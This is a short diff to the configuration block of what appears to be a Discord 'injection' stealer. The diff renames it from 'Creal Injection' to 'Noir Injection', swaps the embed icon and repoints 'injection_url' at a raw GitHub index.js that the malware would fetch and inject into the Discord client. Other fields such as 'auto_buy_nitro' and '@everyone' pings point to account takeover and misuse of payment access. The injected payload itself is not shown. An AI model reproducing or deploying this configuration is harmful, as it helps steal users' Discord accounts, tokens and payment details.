@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'Creal Injection', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg?size=4096'.replace(/ /g, '%20'), 
+  embed_name: ' Noir Injection', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1104432038922174585/1104900671045636097/Banniere_2-1.png?size=4096'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://github.com/Hyrox1336ontop/index.js/new/', 
+  injection_url: 'https://raw.githubusercontent.com/Hyrox1336ontop/index.js/main/index.js', 
   /**
    
    **/
